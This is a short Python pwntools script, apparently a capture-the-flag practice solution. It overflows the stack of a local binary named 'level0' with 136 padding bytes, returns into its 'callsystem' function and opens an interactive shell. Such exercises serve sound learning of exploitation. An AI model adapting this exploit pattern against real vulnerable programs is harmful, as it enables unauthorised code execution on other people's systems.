from pwn import *


def ret2_text2(file_name='/mnt/hgfs/CyberSecurity/PWN/test/pwn0/level0'):
    print('call ret2_text2 start')
    try:
        io = process([file_name])
        elf = ELF(file_name)

        system_sh_plt = p64(elf.symbols['callsystem'])
        payload = b'A' * 136 + system_sh_plt

        io.sendline(payload)
        io.interactive()
    except Exception:
        return False
    finally:
        print('call ret2_text2 end\n\n')

    return True


if __name__ == '__main__':
    ret2_text2()
